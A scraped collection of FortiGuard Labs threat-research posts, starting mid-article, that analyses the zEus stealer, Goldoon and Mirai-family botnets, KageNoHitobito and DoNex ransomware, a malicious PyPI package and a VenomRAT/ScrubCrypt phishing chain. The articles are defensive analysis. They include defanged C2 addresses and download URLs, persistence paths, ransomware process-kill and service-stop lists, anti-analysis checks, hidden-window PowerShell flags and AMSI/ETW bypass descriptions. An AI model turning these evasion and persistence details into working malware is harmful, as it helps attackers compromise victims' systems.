execution to keep terminating Task Manager. This is set to auto-run to ensure the screen lock mechanism works. zEus drops Screen.bat to keep sending a screenshot to the webhook every five seconds. This is executed automatically at startup to keep monitoring the victim’s computer. SYSTEMLOCK.bat and configSYSLOCK.vbs are dropped to perform this task. configSYSLOCK.vbs is the launcher for SYSTEMLOCK.bat. The attacker can execute configSYSLOCK.vbs via C2 communication. SYSTEMLOCK.bat pops up a message box telling the victim not to restart the computer and closes explorer.exe to stop the victim from interacting with most Windows items. The SYSTEMLOCK.bat then keeps executing bsod.hta, which it dropped to the ProgramData folder. This HTA file just shows a full-screen blank window. However, debugkiller.bat prevents the victim from opening Task Manager, so most well-known methods to stop a program are blocked. CHATBOX.bat is dropped to allow the victim to send at most five sentences to the attacker. This can be executed via C2 communication. zEus stealer drops RAT.bat to build C2 communication. RAT.bat downloads command-line instructions from onlinecontroler[.]000webhostapp[.]com to COMMANDS.txt. If the instruction is not duplicated, it will be executed, and the result will be written to HISTORY.txt later. The executed instruction is sent to the attack’s webhook to show the current situation. In addition, special messages for screen lock and chat box help the attacker with troubleshooting. RAT.bat is set to auto-run to continuously control the computer. zEus stealer has a relatively simple attack flow, but it collects a wide variety of information that provides data for the next attack and contributes to social engineering. This is a reminder about the dangers of downloading and using files from an unknown source. Even a source pack, usually loaded by the software, can be a carrier for malware. In addition to only downloading files from reputable sources and checking reviews of a file and author, FortiGuard Labs recommends enabling MFA as an additional protection layer. MFA prevents unauthorized account access if a password has been compromised and can also alert users to unusual account activities. We also recommend subscribing to a service like FortiRecon that automatically scans the web for leaked data.

In our2H 2023 Threat Landscape Report, we examine the cyberthreat landscape over the year’s second half to identify trends and offer insights on what security professionals should know to effectively protect their organizations. The report findings are based on the collective intelligence ofFortiGuard Labs, drawn from Fortinet’s vast array of sensors collecting billions of threat events observed worldwide during this same period. Below are key takeaways from the report. During this period, we observed substantial activity among APT groups, more targeted ransomware attacks, new botnets and malware strains, and an uptick in IoT exploits. We’re seeing a continued trend of threat actors reusing “old” attacks, underscoring the importance of security practitioners remaining vigilant, as attackers aren’t likely to stop exploiting older vulnerabilities. Notably, adversaries are moving quicker than ever, exploiting new vulnerabilities 43% faster than in the first half of the year. This finding underscores the need for organizations to improve their patch management processes, ensuring that they’re updating software regularly to protect against fast-moving adversaries. Vendors also play a vital role in enabling customers to mitigate vulnerability risk. Every vendor has a responsibility to dedicate themselves to radical transparency, introducing robust security scrutiny at all stages of the product development lifecycle and proactively searching for and disclosing vulnerabilities. It’s no surprise that the threat of ransomware continues to keep security teams up at night. Across our sensors, ransomware detections surged 13 times higher over the first half of 2023. That was followed by a 70% drop during the latter half of the year, during which we also saw fewer organizations detecting ransomware variants. However, this shift isn’t a cause for celebration. In our2024 threat predictions report, we forecasted that adversaries looking for bigger payouts would turn their attention to critical sectors. This prediction came to fruition in 2H 2023: We witnessed a shift away from the traditional “spray and pray” ransomware strategy, with cybercriminals taking a more targeted approach and asking for higher ransom demands. Industrial organizations—including energy, healthcare, manufacturing, transportation, and automotive—experienced almost half (44%) of all ransomware and wiper detections in the second half of the year. Our FortiGuard Labs team monitors an array of globally deployed sensors that collect trillions of threat events worldwide each day. This unique vantage point gives us a detailed view of the threat landscape, including how exploit, malware, and botnet trends change. Exploitation activity captured by the FortiGuard Intrusion Prevention System (IPS) sensors running on our FortiGate Next-Generation Firewalls offers us visibility into how threat actors find vulnerabilities, exploit their targets, and build malicious infrastructure. Not surprisingly, IoT devices were popular targets, with attackers exploiting everything fromfirewallstoroutersduring the year’s second half. After threat actors find an exploitable vulnerability, their next step is often to deploy malware. Samples picked up by our various anti-malware solutions give us a better understanding of popular adversary tools, like JS/ScrInject and JS/Cryxos. Outside of these two consistently prevalent strains, four other malware families caught our attention in 2H 2023:AndroxGh0st,Apache ActiveMQransomware,Lazarus RATs, andAgent Tesla. Once infected with malware, systems often attempt to communicate with remote hosts to download additional payloads, establish command and control channels, and open backdoors into the environment. Botnet insights are vital to understanding the full scope of an attack. While we consistently see activity among Gh0st, Mirai, and ZeroAccess, we identified several new botnets to watch, including Prometei and DarkGate. In each threat landscape report, we aim to determine how long it takes for a vulnerability to move from initial release to exploitation and whether vulnerabilities with a highExploit Prediction Scoring System(EPSS) score are exploited faster. For the new exploits identified, attacks occurred an average of 4.76 days after discovery, which is 43% faster than the time-to-exploitation observed in 1H 2023. This underscores the need to use EPSS as an early warning system, as well as the importance of prioritizing patching efforts to mitigate the vulnerabilities most likely to be exploited. In 2022, we introduced the concept ofthe “red zone,”which helps security practitioners better understand how likely (or unlikely) it is that threat actors will exploit a specific vulnerability.We aim to help security teams prioritize their remediation efforts, focusing on the vulnerabilities that present the most significant risk. The good news is that only a fraction (<1%) of all published vulnerabilities were exploited in 2H 2023. However, when it comes to vulnerabilities, remember that what’s “old” is still new in the eyes of many attackers. We continue to see threat actors exploiting vulnerabilities over 15 years old, and nearly all organizations (98%) have detected exploits in their environments that have been in attackers’ toolboxes for at least five years. APT groups continue to be highly adaptable to changes in the digital landscape and are increasingly stealthy, carefully planning and executing their attacks. Based on intelligence from FortiRecon, we observed 38 of the 143 APT groups (27%) identified by MITRE as being active during the second half of the year. Of those, Lazarus Group, Kimusky, APT28, APT29, Andariel, and OilRig were the most active. While much of our telemetry shows us what actions attackers have taken previously, darknet intelligence helps us anticipate what adversaries may do next. In the last six months of 2023, threat actors discussed targeting organizations within the financial services industry most often, followed by the business services and education sectors. More than 20 significant zero days were shared on the dark web, and over 850,000 payment cards were advertised for sale. The most publicly active threat actors across the dark web were Valerka, Punktir, CoreLab, XXXX, and qwer. Disrupting cybercrime requires a culture of collaboration, transparency, and accountability on a larger scale than possible with each entity working independently. Cybersecurity vendors have a crucial role to play in this endeavor. Join us atRSA Conference 2024to learn more about the importance of driving responsible transparency across the industry during the session, “No More Secrets in Cybersecurity: Implementing Radical Transparency.” This discussion will feature renowned experts from organizations such as the Cyber Threat Alliance, the Cybersecurity and Infrastructure Security Agency (CISA), Fortinet, and the Former Undersecretary of the Department of Homeland Security. The latest Global Threat Landscape Report represents the collective intelligence of FortiGuard Labs, drawn from Fortinet’s vast array of sensors collecting billions of threat events observed worldwide during the second half of 2023. The FortiGuard Labs Global Threat Landscape Report uses the MITRE ATT&CK framework to describe how threat actors find vulnerabilities, build malicious infrastructure, and exploit their targets.

    "content": "FortiGuard Labs Threat Research Affected Platforms:D-Link DIR-645 Wired/Wireless Router Rev. Ax with firmware 1.04b12 and earlierImpacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:High In April, FortiGuard Labs observed a new botnet targeting a D-Link vulnerability from nearly a decade ago, CVE-2015-2051. This vulnerability allows remote attackers to execute arbitrary commands via a GetDeviceSettings action on the HNAP interface. As a result, an attacker can create a crafted HTTP request with a malicious command embedded in the header. Our IPS signature captured attempts to exploit the CVE-2015-2051 vulnerability to propagate a new botnet that we have named “Goldoon.” Figure 1 shows the attack packet. If a targeted device is compromised, attackers can gain complete control, enabling them to extract system information, establish communication with a C2 server, and then use these devices to launch further attacks, such as distributed denial-of-service (DDoS). Our telemetry data also indicates that this botnet activity spiked in April, almost doubling the usual frequency. In this article, we will provide detailed insights into the propagation and actions of the Goldoon botnet. The attackers initially exploit CVE-2015-2051 to download a file “dropper” from “hxxp://94[.]228[.]168[.]60:8080.” The script is programmed to automatically download, execute, and clean up potentially malicious files across various Linux system architectures, including aarch64, arm, i686, m68k, mips64, mipsel, powerpc, s390x, sparc64, x86-64, sh4, riscv64, DEC Alpha, and PA-RISC. Each downloaded file, named “goldoon,” is executed immediately after its download and permission adjustment. After execution, the script removes the executed file and then deletes itself to erase any trace of its activity, thereby enhancing its stealth. The primary role of the “i686-linux-gnu” downloaded from the dropper is to get the botnet file. It first employs the XOR key, “YesItsAnAntiHoneypotBaby,” to decrypt the specific strings “linux” and “i686-linux-gnu.” After decoding, it attaches them to “/bins” to construct the full Uniform Resource Identifier (URI). It uses a fixed header, “User-Agent: FBI-Agent (Checking You),” to get the ultimate payload. Any attempt to open the targeted URI using a web browser will lead to the error message shown in Figure 7. Finally, it iterates through a set of paths, modifying each file it can write to and then deleting those files after modification. This is another cleanup mechanism to cover its tracks in a compromised system. Through analyzing the malware, we found that it has the following behaviors: Goldoon first initializes some required arguments for establishing a connection. For example, it uses “WolfSSL” for traffic encryption and sets the Google DNS server (i.e., “8.8.8.8”, “8.8.4.4”) as a DNS resolver. This allows the malware to carry through its attack. There are ten different autorun methods, each aiming to execute malware while the victim’s computer is starting up. We can classify them into the following types: Boot Execution, Daemon, and Logon Execution. The malware can execute itself through Linux booting initialize files or applications, such as “/etc/rc.local,” “crontab,” etc. Otherwise, it can be created as a daemon named “goldoon.server” and later enable itself to persist in the victim’s computer. In addition, the malware can also execute automatically as soon as the victim logs on to the compromised device. Autorun Type Autorun Method Boot Execution /etc/rc.local /etc/init.d/startup_script /etc/init.d/S99startup crontab /etc/profile Daemon /etc/systemd/system/goldoon.service /etc/inittab Logon Execution ~/.bashrc ~/.config/autostart/goldoon.desktop /etc/xdg/autostart/goldoon.desktop The Goldoon malware continuously tries to connect to its C2 server until a connection is established. It also records information about the targeted system, such as user name, etc. Once completed, the Goldoon malware receives packets from the C2 server. These contain commands for follow-up actions. The packet has seven cases that are set off by the C2 server. Two of them have obviously malicious purposes. One executes commands through “/bin/bash -c” on the victim host, and the other triggers different DoS attacks. According to our analysis, this malware contains an astounding 27 different methods related to various attacks. Protocol Attack Method ICMP ICMP Flooding TCP TCP Flooding, XMAS Attack, etc. UDP UDP Flooding DNS DNS Flooding HTTP HTTP Bypass, HTTP Flooding, etc. Other Minecraft DDoS Attack Table 2: Attack Methods Take a TCP SYN flooding attack as an example. The malware first gathers information about the target, such as its IP and port, and even checks whether the target IP is IPv6. Goldoon can launch DoS attacks through common protocols, including the game Minecraft. The malware uses various packets to launch a DoS attack, especially for attacks through TCP, which includes more than ten types of packets. Because some of these methods are empty, such as “http_exploit,” “http_xflow,” “http_pps,” and “http_cps,” we deduce that the attacker may have an ongoing development of the malware. While CVE-2015-2051 is not a new vulnerability and presents a low attack complexity, it has a critical security impact that can lead to remote code execution. Once attackers successfully exploit this vulnerability, they can incorporate compromised devices into their botnet to launch further attacks. FortiGuard Labs has identified one such new botnet, “Goldoon,” that is exploiting this vulnerability, reminding us that botnets continue to evolve and exploit as many devices as possible. We strongly recommend applying patches and updates whenever possible because of the ongoing development and introduction of new botnets.

    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the KageNoHitobito and DoNex ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Steals and encrypts victims' files and demands ransom for file decryption and not releasing the stolen data.Severity level:High KageNoHitobito ransomware samples became available in late March 2024. As with most ransomware, this ransomware encrypts files on victims' machines and demands a ransom to decrypt them through dropped ransom notes. Although the group uses TOR to communicate with its victims, a data leak site is unavailable as it does not claim to have stolen any victims' information. Information on the infection vector used by the KageNoHitobito ransomware threat actor is unavailable. The KageNoHitobito ransomware samples were submitted to a publicly available file scanning service from several countries: Chile, China, Cuba, Germany, Iran, Lithuania, Peru, Romania, Sweden, Taiwan, the United Kingdom, and the United States. This suggests that the KageNoHitobito ransomware threat actor may have made the malware available on file-sharing services as fake software or game cheats and lured victims to these locations. The KageNoHitobito ransomware is designed to encrypt files only on the local drive, not on networked drives. The files encrypted by the ransomware have a “.hitobito” extension. It avoids encrypting files with the following file extensions: .dat .dll .exe .ini .log .sys The ransomware is designed not to continue if the current date of the compromised machine is 14 days after March 21, 2024. The ransomware displays a ransom note on the victim’s desktop and drops a text-based ransom note called \"KageNoHitobito_ReadMe.txt.\" KageNoHitobito is Japanese and can be translated as \"shadow people.\" We could not associate the term \"shadow people\" with any popular culture, including Japanese anime, to which some threat actors are fixated. The ransom note instructs victims to visit a TOR site that uses the AbleOnion chat platform and join a chat room. This site does not appear to be specific to the KageNoHitobito ransomware, as the ongoing group chat in both the designated chat room and the group chat at the time of our investigation is unrelated to ransom negotiations. DoNex is a relatively new, financially motivated ransomware group first reported in early March 2024. The file creation time of the samples is mid-February, so the ransomware may have been distributed prior to the date of the first report. All victims of the DoNex ransomware on the data leak site were added in February. Information about the infection vector used by the DoNex ransomware threat actor is unavailable. However, it is not likely to be significantly different from other ransomware groups. The DoNex ransomware’s data leak site on TOR listed five victims during our investigation. The organizations that were claimed to have been affected by the ransomware are located in Belgium, the Czech Republic, Italy, the Netherlands, and the United States. The actions of DoNex ransomware are dictated by a configuration file set by the threat actor. The DoNex ransomware encrypts files on both local drives and network shares, as <local_disks> and <network_shares> are set to true. The ransomware adds a victim ID as a file extension to the affected files and changes their file icons. According to the <while_extens> section in the configuration file, DoNex ransomware avoids encrypting files with the following extensions: 386 adv ani bat bin cab cmd com cpl cur deskthemepack diagcab diagcfg diagpkg dll drv exe hlp icl icns ico ics idx lnk mod mpa msc msp msstyles msu nls nomedia ocx prf ps1 rom rtp scr shs spl sys theme themepack wpx lock key hta msi pdb search-ms It also avoids encrypting the following files listed in <white_files>: bootmgr autorun.inf boot.ini bootfont.bin bootsect.bak desktop.ini iconcache.db ntldr ntuser.dat ntuser.dat.log ntuser.ini thumbs db GDIPFONTCACHEV1.DAT d3d9caps.dat The DoNex ransomware does not encrypt files in the following folders listed in <white_folders>: $recycle.bin config.msi $windows.~bt ;$windows.~ws windows boot program files program files (x86) programdata system volume information tor browser windows.old intel msocache perflogs x64dbg public all users default microsoft appdata It terminates the following processes listed in <kill_keep>: sql oracle mysq chrome veeam firefox excel msaccess onenote outlook powerpnt winword wuauclt It terminates the following services listed in <services>: vss sql svc$ memtas mepocs msexchange sophos veeam backup GxVss GxBlr GxFWD GxCVD GxCIMgr The ransomware is configured to delete shadow copies, making file recovery difficult. It then drops a ransom note labeled “Readme.[victim ID].txt} that demands contact via a TOR site, TOX chat, or email. Another ransomware, DarkRace, which appeared in mid-2023, uses a very similar ransom note and has the same configuration file, indicating that DoNex is possibly based on DarkRace and that the threat actor behind DoNex may be the same as DarkRace. During our research, the DoNex ransomware was operating a data leak site on TOR, which listed five victims in Europe and North America. Since no new victims have been added since February 27th, the threat actor has likely already ceased operations and moved on. The KageNoHitobito and DoNex/DarkRace ransomware described in this report are detected and blocked by FortiGuard Antivirus as: FortiGate, FortiMail, FortiClient, and FortiEDR support theFortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.

Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack.

The service can detect evidence of attacks in progress allowing customers to rapidly respond to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3).

    "content": "FortiGuard Labs Threat Research Affected platforms:All platforms where PyPI packages can be installedImpacted parties:Any individuals or institutions that have these malicious packages installedImpact:Leak of credentials, sensitive information, etc.Severity level:High Vigilance is paramount in cybersecurity, especially when it comes to understanding and dissecting potentially malicious code. In this blog post, we'll delve into a piece of code designed (discordpy_bypass-1.7 ) to extract sensitive data from user systems. We'll analyze its components, functions, and methodologies to understand its purpose and approach. FortiGuard Labs uses a proprietary, AI-driven OSS malware detection system to hunt for and monitor threats. Using this approach on the Python Package Index (PyPI) supply chain platform, we unearthed a malicious PyPI package named discordpy_bypass-1.7, published on March 10, 2024, and detected on March 12, 2024. This code aims to covertly extract sensitive information from unsuspecting victims using a blend of persistence techniques, browser data extraction, and token harvesting. Understanding the origins and propagation methods of malicious code is paramount in its analysis. Authored by theaos, the author produced seven versions of the package, including versions 1.1, 1.2, 1.3, 1.4, 1.5, 1.6, and 1.7. The upgrade-colored_0.0.1 also exhibits similar malicious content as discordpy_bypass, indicating a consistent behavior pattern across versions. \"discordpy_bypass-1.7\" highlights the sort of ongoing threats seen across the cybersecurity landscape. This PyPI package version exhibits similar malicious behavior to previous malicious packages, focusing on extracting sensitive data from user systems through obfuscated code and evasion techniques targeting analysis environments. The code employs various checks to detect debugging or analysis environments and terminates itself if detected, showcasing the author's effort to evade scrutiny. The code has three layers. The original Python code is encoded using base64 (the innermost layer). The encoded strings are then broken into separate pieces and encoded once again with some obfuscation techniques (intermediate layer). The obfuscated file is then compiled using pyinstaller into an exe (the last layer) put on a remote URL. The code in discordpy_bypass/discordpy_bypass.py fetches the code from the URL and runs it on the user's device. This underscores the critical need for vigilance and proactive measures to effectively detect and mitigate cybersecurity threats. One of the first lines of defense code developers use against reverse engineering is detecting debugging or analysis environments. The code segment employs multiple techniques, listed below, to identify such environments and terminate the program’s “self-destruct” if detected. Block listed Processes: These iterate over the running processes and terminates them if their names match those in the blocked process list (“blacklistedProcesses”). These processes include debugging tools like Wireshark, OllyDbg, and IDA64 Network-related Checks: Compares system IP and MAC addresses against block lists (“blackListedIPS”, “blackListedMacs”). If the IP or MAC address is found in a block list, it returns “True,” indicating a debugging environment. System-related Checks: Compares system username, hostname, and hardware ID against block lists. (“blackListedUsers,” “blackListedPCNames,” and “blackListedHWIDS”) The code initializes a number of variables and sets up Socket.IO events to handle connections, disconnections, frame adjustments, and more. It enables remote control and monitoring of a system, facilitating actions such as directory navigation, file operations, and command execution. Several functions handle commands received over Socket.IO, executing various actions based on the command received. These actions include listing directory contents, sending files to the server, displaying alerts, listing processes, terminating processes, gathering system information, and more. Browser Data Extraction and Token Harvesting: The code's core functionality revolves around extracting sensitive information from browsers and harvesting authentication tokens, particularly from Discord. Browser Data Extraction: It utilizes techniques to extract data such as login credentials, cookies, web history, and more from various browsers. Token Harvesting: This process also decrypts and validates authentication tokens extracted from files, particularly Discord tokens, before uploading them to a remote server. Our investigation into the \"discordpy_bypass-1.7\" code has uncovered a clever and sneaky cyber threat to secretly steal important information from people's computers. What makes this code especially dangerous is how it tries to trick computer systems and experts who attempt to analyze it. It's like a master of disguise that can escape from being caught. This discovery reminds us that the internet isn't always a safe place. We need to stay alert to protect ourselves from such threats. Understanding them helps us build stronger defenses and stay safe in our digital world. By working together and staying cautious, we can keep our personal information and digital lives secure.

    "content": "FortiGuard Labs Threat Research Affected Platforms:TP-Link Archer AX21 (AX1800) Version 1.1.4 Build 20230219 or priorImpacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:High Last year, a command injection vulnerability,CVE-2023-1389, was disclosed and a fix developed for the web management interface of the TP-Link Archer AX21 (AX1800). FortiGuard Labs has developed an IPS signature to tackle this issue. Recently, we observed multiple attacks focusing on this year-old vulnerability, spotlighting botnets like Moobot, Miori, the Golang-based agent “AGoent,” and the Gafgyt Variant. Peaks caused by these threats are evident in the following figure. This article will explore their infection traffic patterns and offer insights into these botnets. This is an unauthenticated command injection vulnerability in the “locale” API available via the web management interface. Users query the specified form “country” and conduct a “write” operation, which is handled by the “set_country” function. It calls the “merge_config_by_country” function and concatenates the argument of the specified form “country” into a command string, which is executed by the “popen” function. Since the “country” field won’t be emptied, the attacker can achieve command injection. AGoent is a Golang-based agent bot. It first fetches the script file ”exec.sh“ from ”hxxp://5[.]10[.]249[.]153,” which retrieves the ELF files of different Linux-based architectures. After downloading the ELF files, the script will attempt to execute each file to find the appropriate architecture and remove each file to erase intrusion traces. The following analysis will focus on the executed file designed for the”386” architecture. There are two primary behaviors. The first is to create the host username and password using random characters. After user creation, the malware establishes a connection with the C&C (command and control) server and passes on the credentials just created by the malware. Gafgyt, also known as BASHLITE, is malware that infects Linux architecture operating systems to launch a DDoS (distributed denial of service) attack. In this variant, the bot downloads the script file “bins.sh” from “hxxp://195[.]62[.]32[.]227” and then executes the script. Gafgyt retrieves Linux architecture execution files with the prefix filename “rebirth.” We will next focus on “rebirth.x86.” Gafgyt gets the compromised target IP and architecture information, which it concatenates into a string that is part of its initial connection message. After establishing a connection with its C&C server, the malware receives a continuous \"PING\" command from the server to ensure persistence on the compromised target. The malware waits for any of the following commands from its C&C server. Each of them stands for a specified attack or function: Moobot fetches a script file from “hxxp://91[.]92[.]253[.]70.” The primary role of “1.sh” is to retrieve an ELF file with different architectures for further infection. The following analysis looks at the execution file designed for the “x86_64” architecture. Once executed, it removes itself and erases all traces from the compromised device. It then displays “0x00000e9” in the console and starts contacting the C2 server “fjsnsinfinsf[.]ngcv[.]top” Based on the XOR key “0xDEADBEEF” used for encoded strings and the hardcoded string “w5q6he3dbrsgmclkiu4to18npavj702f,” we can confirm this malware as Moobot. As the assembly indicates, a DDoS attack can be initiated on remote IPs via a C2 command. Additionally, there is an attack using a variant of Mirai. The exploitation process begins by downloading “tenda.sh” from “hxxp://94[.]156[.]8[.]244.” This script file then downloads an ELF execution file from the same IP address, available in 13 different architectures. The original execution file is compressed using UPX. This Mirai variant displays the message, “faggot got malware'd,” and monitors processes to terminate those associated with packet analysis tools. It then sends packets to the C2 server “45[.]155[.]91[.]135:21425” and awaits additional instructions for attacking. Below is an illustration of a DDoS attack scenario: The command and control (C2) server sends a packet with a length of 0x15, directing the endpoint to initiate an attack. The command specified is 0x01 for a Valve Source Engine (VSE) flood, with a duration of 60 seconds (0x3C), targeting a randomly selected victim's IP address and the port number 30129. Miori, another Mirai variant, shares similar modules. The batch script is fetched from “hxxp://185[.]224[.]128[.]34.” The downloader employs both HTTP and TFTP protocols to retrieve the ELF files. Once executed, Miori displays “your device just got infected to a bootnoot” in the console and sends \\x00\\x00 to the C2 server “rooty[.]cc” on TCP port 33335. The XOR key used for decoding configuration is 0xDFEDDEEF, and a hardcoded password list is included for the brute force attack function. The attacking command packet resembles those seen in previous Mirai variants. Condi’s downloader script was retrieved using multiple protocols to enhance the infection rate. Condi is executed with the parameter “work,” which is included in the first packet sent to the C2 server “bn[.]networkbn[.]click.” The command remains consistent withthe version distributed last year, retaining the function to prevent reboots by deleting binaries responsible for shutting down or rebooting the system. It also scans active processes and cross-references with predefined strings to terminate processes with matching names. Based on its selling page, Condi has updated its attacking methods, as shown below. As usual, botnets relentlessly target IoT vulnerabilities, continuously attempting to exploit them. Despite the discovery and provided remediation for the vulnerability CVE-2023-1389 last year, numerous campaigns still exploit it, resulting in significant peaks in our IPS telemetry. Users should be vigilant against DDoS botnets and promptly apply patches to safeguard their network environments from infection, preventing them from becoming bots for malicious threat actors.

    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High Last year, FortiGuard Labs uncovered the 8220 Gang’s utilization ofScrubCryptto launch attacks targeting exploitable Oracle WebLogic Servers. ScrubCrypt has been described as an “antivirus evasion tool” that converts executables into undetectable batch files. It offers several options to manipulate malware, making it more challenging for antivirus products to detect. We recently discovered a threat actor distributing a phishing email containing malicious Scalable Vector Graphics (SVG) files. The email lures victims into clicking on an attachment, which downloads a ZIP file containing a Batch file obfuscated with the BatCloak tool. ScrubCrypt is then used to load the final payload, VenomRAT while maintaining a connection with a command and control (C2) server to install plugins on victims’ environments. The plugin files downloaded from the C2 server include VenomRAT version 6, Remcos, XWorm, NanoCore, and a stealer designed for specific crypto wallets. This article provides detailed insights into how the threat actor distributes VenomRAT and other plugins. The attacker initiates the attack by sending a phishing email stating that a shipment has been delivered. It also includes an attached invoice. The attachment is an SVG file named “INV0ICE_#TBSBVS0Y3BDSMMX.svg,” which contains embedded base64-encoded data. After victims open the SVG file, the ECMAScript creates a new blob and utilizes “window.URL.createObjectURL” to drop the decoded data as a ZIP file named “INV0ICE_#TBSBVS0Y3BDSMMX.zip.” The decompressed file is an obfuscated batch file that embeds its payload in the section “------BEGIN X509 CRL-----.” Based on the decoded comment in the first line, it is presumed that this batch file was created by the BatCloak tool, known for using heavily obfuscated batch files to deploy various malware families. BatCloak has been employed since 2022 to distribute malware while effectively evading detection by antivirus programs. The script initially copies a PowerShell execution file to “C:\\Users\\Public\\xkn.exe” and utilizes the copied file in later commands. It includes parameters in each command, “-WindowStyle hidden -inputformat none -outputformat none -NonInteractive,” to conceal its activity from the victim’s notice. It then decodes the malicious data and saves it as “pointer.png.” After hex-decoding, the result is saved as a “pointer” and moved to “C:\\Users\\Public\\Libraries\\pointer.cmd.” Upon executing “pointer.cmd,” it employs “cmd /c del” to delete all the files mentioned above. The “pointer.cmd” file serves as the ScrubCrypt batch file. It is deliberately cluttered with numerous junk strings to obscure readability. It incorporates two payloads encoded in Base64 format and employs AES-CBC decryption and GZIP compression to decompress them. It uses the PowerShell command “[System.Reflection.Assembly]::Load” to load the decrypted .NET assembly from a byte array, accessing its entry point method and invoking that method to initiate the execution of the assembly's code. The first payload serves two primary purposes: establishing persistence and loading the targeted malware. It determines whether the current user is part of the built-in Administrator role in a Windows operating system to configure its persistence settings. Additionally, it checks for the presence of any debugger. If found, it terminates the program to avoid detection. If the current user holds Administrator privileges, the program duplicates itself to “%AppData%/strt.cmd” and utilizes a PowerShell command to establish a scheduled task named “OneNote 83701.” This task triggers upon user login, executes “strt.cmd,” and operates with elevated privileges. Conversely, if the user lacks Administrator permissions, the program duplicates itself to the “StartUp” folder under the filename “strt.cmd.” Finally, it loads an assembly from an embedded resource named “P,” which contains a compressed assembly. It then invokes the entry point method of the loaded assembly to execute VenomRAT. The second payload from the ScrubCrypt batch file is for AMSI bypass and ETW bypass. VenomRAT is a remote access Trojan (RAT) first identified in 2020. It is a modified version of the well-known Quasar RAT and is distributed through malicious attachments in spam emails. Cybercriminals utilize it to gain unauthorized access and control over targeted systems. As with other RATs, VenomRAT enables attackers to manipulate compromised devices remotely, allowing them to execute various malicious activities without the victim's knowledge or consent. The fundamental configurations of VenomRAT are Base64-encoded, and AES-CBC encrypted. The decrypted data is shown in Figure 14. After completing environmental checks, VenomRAT initiates communication with its C2 server. The initial packet transmitted contains basic information about the victim, such as hardware specifications, username, operating system details, camera availability, execution path, foreground window name, and the name of the antivirus product installed. All C2 sessions are encrypted using the certificate specified in its configuration. By debugging the program, we extracted and decompressed the packets, revealing the keep-alive sessions established with the C2 server. While VenomRAT's primary program may appear straightforward, it maintains communication channels with the C2 server to acquire additional plugins for various activities. The assembly responsible for parsing packets from the server is outlined below. Upon receiving the “save_Plugin” directive from the server, it can decompress the data and save it to the registry. The “save_Plugin” data comprises a DLL file named “SendFile,” which can parse other “plug_in” files sent from the C2 server. If a plugin file with the same name is already in the victim’s environment, it deletes the existing file and creates a new one with the current data. After decompressing the “plug_in” packet data, it examines the “Filename” to determine which PowerShell command to employ. In Figure 21, once a “plugin” packet is received from the server, VenomRAT reads the registry to fetch the data for “SendFile.dll” and executes the payload contained within the plugin. In the following sections, we’ll elaborate on the plugins provided by the VenomRAT C2 server. The first plugin is embedded in ScrubCrypt and loads without landing any execution file in the victim’s environment, which perfectly hides its trace. The second payload from the ScrubCrypt Batch file is called “ScrubBypass.” This file is highly obfuscated to hide the code flow, functions, and strings. ScrubBypass’s main jobs are patching the AMSI scan buffer and EtwEventWrite to achieve AMSI and ETW bypass. The plugin VenomRAT is version 6.0.3. It has a Keylogger function and stores its C2 server information on the Pastebin website. It collects multiple data types, monitors the victim’s keyboard activities, and persistently sends stolen data to the C2 server. NanoCore is a notorious Remote Access Trojan (RAT) first discovered in 2013. It is known for its ability to remotely access and control a victim's computer, often without their knowledge. It continues to be relevant in the cybercrime world due to its source code being leaked and widely distributed in underground forums. This plugin is distributed to compromised devices by an obfuscated VBS file, shown in Figure 26. The script stores the data for the next stage on the website “hxxps://nanoshield[.]pro/files,” which also serves as a Crypter service provider. Initially, it retrieves a JPG file and decodes the target section using the reversed URL as a parameter. Although accessing the second URL, “hxxps://nanoshd[.]pro/files/new_image.jpg?14441723,” was unsuccessful, modifying the hostname to “nanoshield.pro” allowed us to access to a similar file, as seen in the first URL ”hxxps://nanoshield[.]pro/new_image2.jpg?166154725.” The JPG file employs steganographic methods to conceal code inside the picture, embedding malware data encoded in Base64 between the tags <<BASE64_START>> and <<BASE64_END>>. After decoding the JPG file, we obtained a .NET execution file. This file establishes persistence by configuring the registry key “HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run” and checks for any virtual environments. It then downloads encoded data from the “nanoshield.pro/files” URL, reverses the data, replaces the specific string “DgTre,” and employs “RegAsm” to proxy the execution of NanoCore. XWorm is a RAT that spreads through removable drives like USB flash drives, infecting Windows systems. It can steal information or allow remote access. Figure 32 shows the plugin from VenomRAT’s C2 server with the filename “xwrm3.1.vbs” at the end of the packet. In addition to the VBS file, we retrieved another “plug_in” containing a batch script attempting to execute PowerShell commands. It downloads encoded data from “hxxps://kisanbethak[.]com/K/Universallsningen.lpk.” 